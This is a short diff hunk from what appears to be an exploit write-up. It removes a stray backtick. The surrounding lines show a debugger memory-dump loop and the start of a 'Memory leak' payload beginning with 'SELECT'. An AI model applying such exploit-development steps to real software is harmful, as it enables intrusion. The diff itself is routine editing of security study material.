@@ -688,7 +688,7 @@ for i in range(200):
     mem = struct.unpack('<Q',inf.read_memory(y-0x38*i, 0x8))
     print(hex(y-0x38*i) + f'({-i})' +' : ' + hex(mem[0]))
 ```
-`
+
 ### Memory leak
 ```python
 payload = b'SELECT '
